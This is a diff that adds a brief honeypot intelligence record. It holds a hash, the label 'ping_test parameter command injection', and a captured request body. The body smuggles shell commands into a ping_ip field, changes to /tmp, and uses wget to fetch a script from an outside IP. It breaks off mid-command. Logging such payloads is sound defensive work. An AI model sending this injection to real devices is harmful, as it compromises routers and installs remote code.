@@ -1,0 +1,5 @@
+SHA256: d3576a4b4e8375cb543ef52e5dca43b0042ca5c27110d5e185ea72df3a402f0a
+Pattern: ping_test parameter command injection
+Evidence source: T-Pot inbound payload
+
+todo=ping_test&ping_ip=[internal-ip-redacted];cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wge
